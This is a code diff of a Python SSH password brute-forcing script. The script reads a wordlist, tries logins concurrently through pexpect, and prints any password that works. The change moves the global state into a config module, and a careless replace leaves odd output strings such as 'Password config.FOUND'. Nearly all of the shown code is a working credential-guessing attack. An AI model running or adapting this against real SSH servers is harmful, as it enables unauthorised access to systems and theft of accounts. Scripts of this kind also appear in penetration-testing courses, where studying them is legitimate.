@@ -4,24 +4,20 @@ import sys
 import time
 import threading
 from pexpect import pxssh
+import config
 
-MAX_CONNECTIONS = 5
-connection_lock = threading.BoundedSemaphore(value=MAX_CONNECTIONS)
-FOUND = False
-FAILS = 0
+connection_lock = threading.BoundedSemaphore(value=config.MAX_CONNECTIONS)
 
 def connect(host, user, password, release):
     ''' connect to ssh'''
-    global FOUND
-    global FAILS
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print('[+] Password FOUND: ' + password)
-        FOUND = True
+        print('[+] Password config.FOUND: ' + password)
+        config.FOUND = True
     except Exception as e:
         if 'read_nonblocking' in str(e):
-            FAILS += 1
+            config.FAILS += 1
             time.sleep(5)
             connect(host, user, password, False)
         elif 'synchronize with original prompt' in str(e):
@@ -50,10 +46,10 @@ def main():
 
     with open(passwdFile, 'r', encoding='utf-8-sig') as fn:
         for line in fn.readlines():
-            if FOUND:
-                print('[*] Exiting: Password FOUND')
+            if config.FOUND:
+                print('[*] Exiting: Password config.FOUND')
                 sys.exit(0)
-            if FAILS > 5:
+            if config.FAILS > 5:
                 print('[!] Exiting: Too Many Socket Timeouts')
                 sys.exit(0)
             connection_lock.acquire()
